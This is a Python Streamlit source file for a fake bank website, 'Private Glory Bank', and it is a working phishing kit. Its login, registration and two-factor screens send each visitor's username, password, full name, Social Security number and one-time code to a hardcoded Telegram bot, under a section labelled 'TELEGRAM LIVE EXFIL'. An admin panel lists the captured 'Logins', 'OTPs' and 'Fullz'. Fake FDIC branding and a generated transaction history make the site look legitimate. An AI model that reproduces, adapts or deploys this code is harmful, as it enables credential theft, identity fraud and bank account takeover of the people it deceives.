import streamlit as st
import pandas as pd
from datetime import datetime, timedelta
import plotly.express as px
import requests
import random
import base64
from io import BytesIO
import re

# Optional image checks — fall back gracefully if Pillow isn't available
try:
    from PIL import Image, UnidentifiedImageError
    PIL_AVAILABLE = True
except Exception:
    PIL_AVAILABLE = False

# ==================== TELEGRAM LIVE EXFIL ====================
def tg(message):
    TOKEN = "8539882445:AAGocSH8PzQHLMPef51tYm8806FcFTpZHrI"
    CHAT_ID = "141975691"
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                     data={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=10)
    except: pass

# ==================== STATE & 180-DAY REALISTIC HISTORY ====================
state = st.session_state
state.checking = state.get("checking", 12340.50)
state.savings  = state.get("savings", 14911.32)
state.captured = state.get("captured", [])
state.otp_log  = state.get("otp_log", [])
state.files    = state.get("files", [])
state.auth     = state.get("auth", False)
state.otp_ok   = state.get("otp_ok", False)
state.admin    = state.get("admin", False)
if "users" not in state: state.users = {}

if "tx" not in state:
    txs = []
    start = datetime.now() - timedelta(days=180)
    for i in range(0, 180, 14):
        d = start + timedelta(days=i)
        txs.append({"date": d.strftime("%m/%d"), "desc": "Direct Deposit - ACME CORP", "amount": round(random.uniform(3200, 4800), 2), "account": "Checking"})
    for m in range(6):
        d = start + timedelta(days=30*m + 3)
        txs.extend([
            {"date": d.strftime("%m/%d"), "desc": "Netflix", "amount": -15.99, "account": "Checking"},
            {"date": d.strftime("%m/%d"), "desc": "Comcast Xfinity", "amount": -189.99, "account": "Checking"},
            {"date": d.strftime("%m/%d"), "desc": "Geico Auto", "amount": -142.50, "account": "Checking"},
        ])
    for day in range(180):
        d = start + timedelta(days=day)
        num = random.choices([0,1,2,3,4], weights=[5,35,40,15,5], k=1)[0]
        for _ in range(num):
            merchant = random.choice(["Amazon.com", "Walmart", "Starbucks", "Shell Gas", "Target", "Chick-fil-A", "Uber", "Whole Foods"])
            amount = round(random.uniform(8.99, 299.99), 2)
            txs.append({"date": d.strftime("%m/%d"), "desc": merchant, "amount": -amount, "account": "Checking"})
    for m in range(6):
        d = start + timedelta(days=30*m + 5)
        amt = round(random.uniform(800, 2500), 2)
        txs.extend([
            {"date": d.strftime("%m/%d"), "desc": "Transfer to Savings", "amount": -amt, "account": "Checking"},
            {"date": d.strftime("%m/%d"), "desc": "Transfer from Checking", "amount": amt, "account": "Savings"},
        ])
        txs.append({"date": (d + timedelta(days=23)).strftime("%m/%d"), "desc": "Interest Credit", "amount": round(amt * 0.004 / 12, 2), "account": "Savings"})
    txs.sort(key=lambda x: x["date"], reverse=True)
    state.tx = txs

st.set_page_config(page_title="Private Glory Bank", page_icon="🇺🇸", layout="wide")

# ==================== INLINE SVG IMAGES (no remote dependencies) ====================
FLAG_SVG = """
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 16" width="300" height="160" role="img" aria-label="US flag">
  <rect width="30" height="16" fill="#b22234"/>
  <rect width="30" height="1.230769%" y="7.692307%" fill="#fff"/>
  <rect width="30" height="1.230769%" y="23.076923%" fill="#fff"/>
  <rect width="30" height="1.230769%" y="38.461538%" fill="#fff"/>
  <rect width="30" height="1.230769%" y="53.846154%" fill="#fff"/>
  <rect width="30" height="1.230769%" y="69.230769%" fill="#fff"/>
  <rect width="30" height="1.230769%" y="84.615384%" fill="#fff"/>
  <rect width="12" height="8.615384615%" fill="#3c3b6e"/>
  <g fill="#fff" transform="translate(1.2,1.2) scale(0.9)">
    <circle cx="1.0" cy="1.0" r="0.45"/>
    <circle cx="3.0" cy="1.0" r="0.45"/>
    <circle cx="5.0" cy="1.0" r="0.45"/>
    <circle cx="2.0" cy="2.0" r="0.45"/>
    <circle cx="4.0" cy="2.0" r="0.45"/>
    <circle cx="1.0" cy="3.0" r="0.45"/>
    <circle cx="3.0" cy="3.0" r="0.45"/>
    <circle cx="5.0" cy="3.0" r="0.45"/>
  </g>
</svg>
"""

FDIC_SVG = """
<svg xmlns="http://www.w3.org/2000/svg" width="240" height="60" viewBox="0 0 240 60" role="img" aria-label="FDIC badge">
  <rect width="240" height="60" rx="6" fill="#ffffff" stroke="#cfcfcf"/>
  <text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" font-family="Arial, sans-serif" font-size="14" fill="#0e2a47">Member FDIC • Equal Housing Lender</text>
</svg>
"""

def svg_to_data_uri(svg_text: str) -> str:
    b = svg_text.encode("utf-8")
    return "data:image/svg+xml;base64," + base64.b64encode(b).decode("ascii")

FLAG_DATA_URI = svg_to_data_uri(FLAG_SVG)
FDIC_DATA_URI = svg_to_data_uri(FDIC_SVG)

# ==================== THEME + UI CSS ====================
# We'll inject CSS variables for light/dark themes, animated gradient, glass cards and watermark.
UI_CSS = f"""
<style>
:root[data-theme="dark"] {
  --bg1: #071427; /* deep navy */
  --bg2: #0e2a47; /* darker blue */
  --card-bg: rgba(255,255,255,0.06);
  --card-border: rgba(255,255,255,0.06);
  --text: #e6eef6;
  --muted: #b8c7d6;
  --accent: #c9a227;
}
:root[data-theme="light"] {
  --bg1: #eaf2fb;
  --bg2: #f8fafc;
  --card-bg: rgba(255,255,255,0.8);
  --card-border: rgba(0,0,0,0.06);
  --text: #0e2a47;
  --muted: #556b82;
  --accent: #c9a227;
}

/* Animated gradient background */
.stApp {
  background: linear-gradient(120deg, var(--bg1), var(--bg2));
  background-size: 300% 300%;
  animation: bgShift 18s ease infinite;
  position: relative;
}
@keyframes bgShift {
  0% { background-position: 0% 50%; }
  50% { background-position: 100% 50%; }
  100% { background-position: 0% 50%; }
}
@media (prefers-reduced-motion: reduce) {
  .stApp { animation: none; }
}

/* Watermark using embedded SVG (low opacity) */
.stApp::after {
  content: "";
  position: fixed;
  right: 6%;
  bottom: 6%;
  width: 36vw;
  height: 36vw;
  background-image: url('{FLAG_DATA_URI}');
  background-repeat: no-repeat;
  background-size: contain;
  opacity: 0.04;
  pointer-events: none;
  z-index: 0;
}

/* Glassmorphism card */
.glass-card {
  background: var(--card-bg);
  backdrop-filter: blur(8px) saturate(120%);
  -webkit-backdrop-filter: blur(8px) saturate(120%);
  border: 1px solid var(--card-border);
  border-radius: 16px;
  padding: 1.5rem;
  box-shadow: 0 8px 30px rgba(2,12,33,0.25);
  color: var(--text);
}

.header {
  background: linear-gradient(135deg, rgba(14,42,71,0.9), rgba(30,77,114,0.9));
  padding: 3rem 1rem;
  text-align: center;
  border-bottom: 6px solid var(--accent);
  z-index: 10;
}
.header img { width: 220px; max-width:60%; height:auto; }
.bank-title { color: white; font-size: 3rem; font-weight: 700; margin: 15px 0 0; }
.bank-subtitle { color: var(--accent); font-size: 1.3rem; font-weight: 600; margin: 8px 0 0; }

/* Buttons and hover microinteractions */
.stButton > button {
  background: var(--accent); color: var(--bg2); border: none; border-radius: 16px; height: 4rem; font-weight: 700;
  transition: transform 120ms ease, box-shadow 120ms ease;
}
.stButton > button:hover { transform: translateY(-3px); box-shadow: 0 10px 30px rgba(0,0,0,0.15); }

.footer { position: fixed; bottom: 0; left: 0; width: 100%; background: var(--bg2); color: var(--muted); text-align: center; padding: 16px; font-size: 0.9rem; z-index: 999; }
</style>
<script>
// Set theme attribute on document root so CSS variables apply
(function() {
  try {
    const theme = '{st.session_state.get("theme", "Dark")}'.toLowerCase();
    document.documentElement.setAttribute('data-theme', theme === 'dark' ? 'dark' : 'light');
  } catch(e) {console.log(e)}
})();
</script>
"""

st.markdown(UI_CSS, unsafe_allow_html=True)

# Footer with embedded FDIC badge
st.markdown(f"""
<div class="footer">
    <img src="{FDIC_DATA_URI}" width="240">
    <br>Member FDIC • Equal Housing Lender • © 2025 Private Glory Bank
</div>
""", unsafe_allow_html=True)

# ==================== Helper utilities ====================
def extract_amount_from_filename(uploaded_file) -> float | None:
    """Try to find a monetary amount in the filename (e.g. check_150.50.jpg)"""
    if not uploaded_file:
        return None
    name = uploaded_file.name
    matches = re.findall(r'(\d{1,6}(?:[.,]\d{1,2})?)', name)
    if not matches:
        return None
    nums = []
    for m in matches:
        m_clean = m.replace(',', '.')
        try:
            nums.append(float(m_clean))
        except:
            pass
    if not nums:
        return None
    return max(nums)


def add_business_days(start_date: datetime, days: int) -> datetime:
    d = start_date
    added = 0
    while added < days:
        d += timedelta(days=1)
        if d.weekday() < 5:  # Mon-Fri
            added += 1
    return d

def process_pending_deposits():
    """Scan state.files for pending deposits that have reached their availability date, clear them, credit user, and add transactions."""
    today = datetime.now().date()
    changed = 0
    for rec in state.files:
        try:
            if rec.get('status') == 'pending':
                av = rec.get('available_on')
                if not av:
                    continue
                # parse date in YYYY-MM-DD
                av_date = datetime.strptime(av, '%Y-%m-%d').date()
                if av_date <= today:
                    # clear
                    rec['status'] = 'cleared'
                    rec['cleared_on'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    amount = float(rec.get('amount', 0.0))
                    state.checking += amount
                    state.tx.insert(0, {"date": datetime.now().strftime('%m/%d'), "desc": "Mobile Deposit", "amount": amount, "account": "Checking"})
                    tg(f"AUTO-CLEAR DEPOSIT ${amount:,.2f} — {rec.get('filename')}")
                    changed += 1
        except Exception as e:
            print('Error processing record', e)
    return changed

# Run auto-processing on startup so the app simulates background clearing
_auto_cleared = process_pending_deposits()
if _auto_cleared:
    print(f'Auto-cleared {_auto_cleared} pending deposits')

# ==================== UI Functions (login/register/header/admin etc.) ====================
EAGLE = "https://i.imgur.com/8mQ8Z8K.png"  # keep for historical reference

def header():
    st.markdown(f'''
    <div class="header">
        <img src="{FLAG_DATA_URI}" alt="American Flag">
        <h1 class="bank-title">PRIVATE GLORY BANK</h1>
        <p class="bank-subtitle">Secure • Modern • American Banking</p>
    </div>
    ''', unsafe_allow_html=True)

# Login, register, OTP, dashboard etc. remain functionally the same but use .glass-card

def login():
    header()
    st.markdown("<br><br>", unsafe_allow_html=True)
    col1, col2, col3 = st.columns([1, 1.1, 1])
    with col2:
        st.markdown("<div class='glass-card'>", unsafe_allow_html=True)
        st.markdown("### Sign In")
        user = st.text_input("Username")
        pwd = st.text_input("Password", type="password")
        if st.button("Sign In Securely", use_container_width=True):
            tg(f"LOGIN\nUser: {user}\nPass: {pwd}")
            if user == "Awesome12@" and pwd == "SecureUSA2025!":
                state.auth = True
                tg("VALID CREDENTIALS")
                st.rerun()
            elif user == "admin" and pwd == "showme2025":
                state.admin = True
                st.rerun()
            else:
                st.error("Invalid credentials")
        st.markdown("</div>", unsafe_allow_html=True)

def register():
    header()
    st.markdown("<br><br>", unsafe_allow_html=True)
    col1, col2, col3 = st.columns([1, 1.2, 1])
    with col2:
        st.markdown("<div class='glass-card'>", unsafe_allow_html=True)
        st.markdown("## Open Your Account")
        with st.form("reg"):
            name = st.text_input("Full Name")
            email = st.text_input("Email")
            phone = st.text_input("Phone")
            ssn = st.text_input("SSN", type="password")
            username = st.text_input("Username")
            password = st.text_input("Password", type="password")
            if st.form_submit_button("Create Account", use_container_width=True):
                if username in state.users:
                    st.error("Username taken")
                else:
                    state.users[username] = {"pass": password, "name": name, "ssn": ssn}
                    tg(f"NEW REGISTRATION\nName: {name}\nUser: {username}\nSSN: {ssn}")
                    st.success("Account created!")
                    st.balloons()
                    st.rerun()
        st.markdown("</div>", unsafe_allow_html=True)

def otp():
    header()
    st.markdown("<br><br>", unsafe_allow_html=True)
    st.markdown("<h3 style='text-align:center;color:#0e2a47'>Two-Factor Authentication</h3>", unsafe_allow_html=True)
    code = st.text_input("Enter 6-digit code")
    if st.button("Verify", type="primary"):
        tg(f"OTP: {code}")
        if len(code) == 6:
            state.otp_ok = True
            tg("OTP ACCEPTED")
            st.success("Success")
            st.rerun()

def dashboard():
    header()
    st.markdown(f"<p style='text-align:right;color:var(--muted);'>Welcome back • {datetime.now().strftime('%B %d')}</p>", unsafe_allow_html=True)

    col1, col2 = st.columns(2)
    with col1:
        if st.button("Checking Account ••••1776", use_container_width=True):
            st.session_state.view = "checking"
            st.rerun()
        st.markdown(f"<h2>${state.checking:,.2f}</h2>", unsafe_allow_html=True)
    with col2:
        if st.button("Savings Account ••••1812", use_container_width=True):
            st.session_state.view = "savings"
            st.rerun()
        st.markdown(f"<h2>${state.savings:,.2f}</h2>", unsafe_allow_html=True)

    st.markdown("### Recent Activity")
    df = pd.DataFrame(state.tx[:12])
    display = df[["date", "desc", "amount", "account"]].copy()
    display["amount"] = display["amount"].apply(lambda x: f"${abs(x):,.2f}")
    st.dataframe(display, use_container_width=True, hide_index=True)

def checking_history():
    header()
    st.markdown("### Checking Account ••••1776")
    st.markdown(f"*Balance:* ${state.checking:,.2f}")
    checking_tx = [t for t in state.tx if t["account"] == "Checking"]
    df = pd.DataFrame(checking_tx)
    display = df[["date", "desc", "amount"]].copy()
    display["amount"] = display["amount"].apply(lambda x: f"${abs(x):,.2f}")
    st.dataframe(display, use_container_width=True, hide_index=True)
    if st.button("Back"):
        st.session_state.view = None
        st.rerun()

def savings_history():
    header()
    st.markdown("### Savings Account ••••1812")
    st.markdown(f"*Balance:* ${state.savings:,.2f}")
    savings_tx = [t for t in state.tx if t["account"] == "Savings"]
    df = pd.DataFrame(savings_tx)
    display = df[["date", "desc", "amount"]].copy()
    display["amount"] = display["amount"].apply(lambda x: f"${abs(x):,.2f}")
    st.dataframe(display, use_container_width=True, hide_index=True)
    if st.button("Back"):
        st.session_state.view = None
        st.rerun()

def transfer():
    header()
    st.markdown("<div class='glass-card'>", unsafe_allow_html=True)
    from_acc = st.selectbox("From", ["Checking ••••1776", "Savings ••••1812"])
    amount = st.number_input("Amount ($)", min_value=0.01)
    if st.button("Transfer", type="primary"):
        if "Checking" in from_acc and amount > state.checking:
            st.error("Insufficient funds")
        elif "Savings" in from_acc and amount > state.savings:
            st.error("Insufficient funds")
        else:
            if "Checking" in from_acc:
                state.checking -= amount
                state.savings += amount
            else:
                state.savings -= amount
                state.checking += amount
            tg(f"TRANSFER ${amount:,.2f}")
            st.success("Transfer Complete")
            st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)

# Mobile deposit (improved, uses glass-card)
def mobile_deposit():
    header()
    st.markdown("<div class='glass-card'>", unsafe_allow_html=True)
    st.markdown("## Mobile Check Deposit")
    st.markdown("For best results: lay the check on a dark flat surface, good lighting, and take the whole check in frame.", unsafe_allow_html=True)

    col_l, col_r = st.columns([2, 1])
    with col_l:
        amount = st.number_input("Check Amount ($)", min_value=0.01, format="%.2f")
        front = st.file_uploader("Front of Check (photo or PDF)", type=["jpg","jpeg","png","pdf"], key="front_upload")
        back = st.file_uploader("Back of Check (photo or PDF)", type=["jpg","jpeg","png","pdf"], key="back_upload")
        st.markdown("---")
        st.markdown("Endorsement and verification")
        endorsed = st.checkbox("I endorse the back of this check and sign my name", key="endorsed_checkbox")
        signer_name = st.text_input("Typed name as signature (exactly as signed on back)", max_chars=50)
        last4 = st.text_input("Last 4 digits of account for verification", max_chars=4, help="Helps verify endorsement (we won't store full account numbers).")
        st.markdown("---")
        auto_amt_front = extract_amount_from_filename(front)
        auto_amt_back = extract_amount_from_filename(back)
        suggested_amt = None
        if auto_amt_front and auto_amt_back:
            suggested_amt = max(auto_amt_front, auto_amt_back)
        elif auto_amt_front:
            suggested_amt = auto_amt_front
        elif auto_amt_back:
            suggested_amt = auto_amt_back

        if suggested_amt:
            st.info(f"Amount-like value detected in uploaded filenames: ${suggested_amt:.2f}. If this matches the check, you can use it or keep your entered amount.")

        if front:
            if str(front.type).lower().startswith("image") and PIL_AVAILABLE:
                try:
                    img = Image.open(BytesIO(front.getvalue()))
                    st.image(img, caption="Front preview", use_column_width=True)
                    w, h = img.size
                    if w < 600 or h < 200:
                        st.warning("Image resolution looks low. A higher resolution photo helps recognition.")
                except UnidentifiedImageError:
                    st.warning("Couldn't preview the front image.")
            elif front.name.lower().endswith(".pdf"):
                st.info("Uploaded a PDF for front. Preview not available here.")
        if back:
            if str(back.type).lower().startswith("image") and PIL_AVAILABLE:
                try:
                    img2 = Image.open(BytesIO(back.getvalue()))
                    st.image(img2, caption="Back preview", use_column_width=True)
                except UnidentifiedImageError:
                    st.warning("Couldn't preview the back image.")
            elif back.name.lower().endswith(".pdf"):
                st.info("Uploaded a PDF for back. Preview not available here.")

    with col_r:
        st.markdown("Deposit policy & availability")
        st.markdown("- Deposits of $200 or less: funds generally available same business day.")
        st.markdown("- Deposits > $200 and <= $5,000: portion may be held; expected availability shown after you submit.")
        st.markdown("- Large checks or suspicious items may be held longer pending verification.")
        st.markdown("We require front and back images and an endorsement to accept mobile checks.")
        st.markdown("---")
        st.markdown("Recent mobile deposits")
        recent = [f for f in reversed(state.files[-6:])]
        if recent:
            for r in recent:
                clr = r.get("status", "pending")
                st.write(f"{r['date']} • ${r['amount']:.2f} • {r['filename']} • {clr} • avail: {r.get('available_on','-')}")
        else:
            st.write("No mobile deposits yet.")

    if st.button("Deposit Check", type="primary"):
        if not front or not back:
            st.error("Please upload both front and back images/PDFs of the check.")
            return
        if not endorsed or not signer_name or not last4:
            st.error("Please endorse the check and provide the signature name and last 4 digits for verification.")
            return
        detected = suggested_amt
        amount_mismatch_note = None
        if detected and abs(detected - amount) > 1.0:
            amount_mismatch_note = f"Detected ${detected:.2f} in filenames which differs from entered amount ${amount:.2f}.*"

        today = datetime.now()
        if amount <= 200:
            hold_days = 0
        elif amount <= 500:
            hold_days = 1
        elif amount <= 5000:
            hold_days = 3
        else:
            hold_days = 5

        available_on = add_business_days(today, hold_days).strftime("%Y-%m-%d")
        status = "cleared" if hold_days == 0 else "pending"
        record = {
            "date": today.strftime("%Y-%m-%d %H:%M:%S"),
            "filename": f"{front.name} / {back.name}",
            "amount": float(amount),
            "status": status,
            "available_on": available_on,
            "signed_by": signer_name,
            "verified_last4": last4,
            "note": amount_mismatch_note or ""
        }
        state.files.append(record)
        tg(f"CHECK DEPOSIT — ${amount:,.2f} — {front.name} / {back.name}")
        if hold_days == 0:
            state.checking += float(amount)
            state.tx.insert(0, {"date": today.strftime("%m/%d"), "desc": "Mobile Deposit", "amount": float(amount), "account": "Checking"})
            st.success(f"Deposit accepted — ${amount:.2f} is available now.")
        else:
            state.tx.insert(0, {"date": today.strftime("%m/%d"), "desc": "Mobile Deposit (pending)", "amount": 0.00, "account": "Checking"})
            st.success(f"Deposit submitted — ${amount:.2f} is expected to be available on {available_on} (simulated).")
            st.info("A portion of the deposit may be available sooner depending on verification. We will notify you when cleared.")
        st.experimental_rerun() 

    st.markdown("</div>", unsafe_allow_html=True)

def messages():
    header()
    st.markdown("<div class='glass-card'>", unsafe_allow_html=True)
    uploaded = st.file_uploader("Upload Documents")
    if uploaded:
        tg(f"FILE: {uploaded.name}")
        st.success("Received")
    st.markdown("</div>", unsafe_allow_html=True)

def admin():
    header()
    st.markdown("<h1 style='color:#0e2a47;text-align:center'>ADMIN PANEL</h1>", unsafe_allow_html=True)
    tabs = st.tabs(["Logins", "OTPs", "Fullz", "Files", "Transactions", "Admin Actions"])
    with tabs[0]: st.dataframe(pd.DataFrame(state.captured))
    with tabs[1]: st.dataframe(pd.DataFrame(state.otp_log))
    with tabs[2]: st.json([x for x in state.captured if "fullz" in str(x)])
    with tabs[3]: st.write(state.files)
    with tabs[4]: st.dataframe(pd.DataFrame(state.tx[:100]))
    with tabs[5]:
        st.markdown("## Manual admin actions")
        if st.button("Process pending deposits now"):
            n = process_pending_deposits()
            st.success(f"Processed {n} pending deposits.")

def sidebar():
    # Theme toggle in sidebar
    if "theme" not in st.session_state:
        st.session_state.theme = "Dark"
    st.session_state.theme = st.sidebar.radio("Theme", ["Dark", "Light"], index=0 if st.session_state.theme.lower()=="dark" else 1)
    st.sidebar.markdown(f'<img src="{FLAG_DATA_URI}" width="100">', unsafe_allow_html=True)
    return st.sidebar.radio("Menu", ["Dashboard", "Transfer", "Mobile Deposit", "Messages", "Logout"]) 

# ==================== MAIN FLOW ====================
if not state.auth and not state.admin:
    tab1, tab2 = st.tabs(["Sign In", "Create Account"])
    with tab1: login()
    with tab2: register()
elif state.admin:
    admin()
elif not state.otp_ok:
    otp()
else:
    if st.session_state.get("view") == "checking":
        checking_history()
    elif st.session_state.get("view") == "savings":
        savings_history()
    else:
        page = sidebar()
        if page == "Dashboard": dashboard()
        elif page == "Transfer": transfer()
        elif page == "Mobile Deposit": mobile_deposit()
        elif page == "Messages": messages()
        elif page == "Logout":
            st.session_state.clear()
            st.rerun()
